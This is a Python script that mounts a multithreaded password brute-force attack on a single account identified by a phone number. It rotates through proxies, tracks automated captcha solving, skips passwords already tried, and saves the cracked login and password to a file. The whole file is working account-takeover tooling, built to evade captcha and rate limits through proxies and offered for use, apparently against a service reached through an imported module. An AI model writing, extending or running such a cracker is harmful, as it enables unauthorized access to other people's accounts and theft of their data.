import os.path
from threading import Lock

from tools import *

login = "+79999999999"  # User's login
threads = 100  # count of threads. If you have good internet connection, you can increase it
passwords_fname = "./config/out.txt"  # run python passgen.py to generate passwords file
proxies_fname = "./config/proxies.txt"  # you may leave file empty
Worker.ProxyType = 'http://'  # your proxy type. If u wana use socks - https://stackoverflow.com/questions/12601316/how-to-make-python-requests-work-via-socks-proxy
checked_passwords_fname = f"./out/checked_pswd_{login}.txt"
if os.path.exists(checked_passwords_fname):
    with open(checked_passwords_fname, 'r+', encoding="utf-8") as file:
        checked_passwords = set(i.replace('\n', '').replace('\r', '') for i in file)
else: checked_passwords = set()
with open(passwords_fname, encoding="utf-8") as file:
    passwords = []
    for i in file:
        i = i.replace('\n', '').replace('\r', '')
        if i not in checked_passwords and len(i) > 6:
            passwords.append(i)
    passwords = passwords[::-1]
with open(proxies_fname, encoding='utf-8') as file:
    Worker.Proxies = [i.replace('\n', '').replace('\r', '') for i in file.readlines()]


class OneAccountHackWorker(Worker):
    PASSWORDS_LOCK = Lock()
    WRITE_CHECK_LOCK = Lock()
    def _work(self):
        while 1:
            with Worker.Lock:
                if not self.Working: break
            self.one_hack_step()

    def _next_login_password(self):
        global login
        with self.PASSWORDS_LOCK:
            p = passwords.pop()
            return login, p
    def _invalid_pswd(self, login, password):
        with self.WRITE_CHECK_LOCK:
            with open(checked_passwords_fname, 'a', encoding="utf-8") as found_pswd_file:
                found_pswd_file.write(password + '\n')
            checked_passwords.add(password)
    def _on_pswd_found(self, login, password, api, need_2fa):
        with self.Lock:
            print("УРААА!!!!!!!!")
            Worker.Working = False
        with open(f"out_{login}.txt", 'a+', encoding='utf-8') as f:
            f.write(f"{login}:{password}\n")
def status_thread():
    print(f"Starting bruteforce attack for account {colorama.Fore.LIGHTBLUE_EX}{login}{colorama.Fore.RESET}")
    while 1:
        with Worker.Lock:
            if not Worker.Working: break
        time.sleep(5)
        with Worker.Lock:
            print(
                f"Captcha Progress: {colorama.Fore.GREEN}{str(solver.TOTAL_COUNT-solver.FAIL_COUNT).ljust(9,' ')}{colorama.Fore.RESET} success,",
                f"{colorama.Fore.RED}{str(solver.FAIL_COUNT).ljust(9, ' ')}{colorama.Fore.RESET} fail =",
                colorama.Fore.CYAN +
                f"{1 - solver.FAIL_COUNT / (solver.TOTAL_COUNT if solver.TOTAL_COUNT != 0 else 1):.2%}".ljust(7, ' '), 'correct',
                colorama.Fore.RESET,
                f"{(1 / (solver.argv_solve_time or 1)):,.2f} captcha per second"
            )


threads = [OneAccountHackWorker(i) for i in range(threads)]
for i in threads:
    i.start()
threading.Thread(target=status_thread).start()
try:
    for i in threads:
        i.join()
finally:
    Worker.Working = False
